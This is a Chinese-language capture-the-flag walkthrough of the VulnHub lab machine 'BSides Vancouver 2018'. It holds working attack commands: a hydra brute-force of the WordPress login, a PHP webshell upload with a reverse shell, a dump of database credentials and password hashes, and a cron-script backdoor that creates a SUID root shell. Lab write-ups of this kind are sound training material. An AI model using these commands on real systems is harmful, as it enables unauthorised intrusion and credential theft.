# BSides Vancouver: 2018 (Workshop)

2024-5-17 https://vulnhub.com/entry/bsides-vancouver-2018-workshop,231/

difficulty: Intermediate

## IP

192.168.5.28

## Scan

Open Port -> 21,22,80

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 65534    65534        4096 Mar 03  2018 public
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.5.10
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 2.3.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 859f8b5844973398ee98b0c185603c41 (DSA)
|   2048 cf1a04e17ba3cd2bd1af7db330e0a09d (RSA)
|_  256 97e5287a314d0a89b2b02581d536634c (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry
|_/backup_wordpress
|_http-server-header: Apache/2.2.22 (Ubuntu)
```

先看看 21 端口的 ftp 在匿名登陆下，有什么提示信息:

```
ftp> ls
229 Entering Extended Passive Mode (|||18551|).
150 Here comes the directory listing.
drwxr-xr-x    2 65534    65534        4096 Mar 03  2018 public
226 Directory send OK.
ftp> cd public
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||7531|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0              31 Mar 03  2018 users.txt.bk
226 Directory send OK.
ftp> get users.txt.bk -
remote: users.txt.bk
229 Entering Extended Passive Mode (|||34422|).
150 Opening BINARY mode data connection for users.txt.bk (31 bytes).
abatchy
john
mai
anne
doomguy
```

得到了几个用户名，可能跟 80 端口的 web 有关系，继续看 80 端口的 web 服务。

信息侦察，尝试进行目录扫描：

```
gobuster dir -u http://192.168.5.28/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip -e

/index                (Status: 200) [Size: 177]
/robots               (Status: 200) [Size: 43]
/robots.txt           (Status: 200) [Size: 43]
/server-status        (Status: 403) [Size: 293]
```

看看 /robots.txt 有什么信息：

```
User-agent: *
Disallow: /backup_wordpress
```

访问隐藏目录 /backup_wordpress，看到了 wp 的网站。

使用 wpscan 搜集用户名：

```
wpscan --url http://192.168.5.28/backup_wordpress -e u

[+] john
[+] admin
```

找到 2 个 wp 用户名。

使用 cewl 进行密码搜集：

```
cewl -d 5 http://192.168.5.28/backup_wordpress -w pass.txt
```

```
wpscan --url http://192.168.5.28/backup_wordpress -U user.txt -P pass.txt -t 10
```

没有找到相关用户凭据，是否是 passwd 密码字典内容太少，尝试使用 rockyou 进行爆破。

```
hydra -t 20 -L users.txt -P ~/tools/dict/rockyou.txt 192.168.5.28 -f http-post-form "/backup_wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fbackup_wordpress%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username"

[80][http-post-form] host: 192.168.5.28   login: john   password: enigma
```

得到用户凭证：john:enigma，登陆 wp 管理后台。

写入 webshell，在 http://192.168.5.28/backup_wordpress/wp-admin/theme-install.php 中上传 theme 对应的 php 脚本代码，对应的访问地址为 http://192.168.5.28/backup_wordpress/wp-content/uploads/2024/05/8888.php，在kali中监听8888端口，得到了反弹的shell。

先查看到 wp 的数据库配置信息：

```
/var/www/backup_wordpress$ cat wp-config.php

define('DB_NAME', 'wp');
define('DB_USER', 'john@localhost');
define('DB_PASSWORD', 'thiscannotbeit');
define('DB_HOST', 'localhost');
```

得到数据库中的用户信息：

```
+----+------------+------------------------------------+---------------+--------------------+----------+---------------------+
| ID | user_login | user_pass                          | user_nicename | user_email         | user_url | user_registered     |
+----+------------+------------------------------------+---------------+--------------------+----------+---------------------+
|  1 | admin      | $P$BmuGRQyHFjh1FW29/KN6GvfYnwIl/O0 | admin         | admin@thissite.com |          | 2018-03-07 20:05:07 |
|  2 | john       | $P$BVlPsus0zgh1RoU3VGUI4zfyNNPcyT0 | john          | john@thissite.com  |          | 2018-03-07 20:06:16 |
+----+------------+------------------------------------+---------------+--------------------+----------+---------------------+
```

得不到 admin 的哈希对应的明文密码。

/home 目录下发现了几个用户：

```
abatchy
john
mai
anne
doomguy
```

经过查看，没有发现什么有价值的信息。

看看 crontab，发现了重要信息：

```
www-data@bsides2018:/home/abatchy$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /usr/local/bin/cleanup

www-data@bsides2018:/home/abatchy$ ls -al /usr/local/bin/cleanup
-rwxrwxrwx 1 root root 64 Mar  3  2018 /usr/local/bin/cleanup
```

root 用户每分钟调用/usr/local/bin/cleanup ，并且我们对这个脚本有完全的用户权限，将我们的后门代码直接写入其中：

```
echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' >> /usr/local/bin/cleanup
```

等待 1 分钟后，得到了 suid 的 bash，执行后得到了 root 权限的 shell：

```
www-data@bsides2018:/tmp$ /tmp/rootbash -p
rootbash-4.2# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
rootbash-4.2# cd /root
rootbash-4.2# cat flag.txt
Congratulations!

If you can read this, that means you were able to obtain root permissions on this VM.
You should be proud!

There are multiple ways to gain access remotely, as well as for privilege escalation.
Did you find them all?

@abatchy17
```
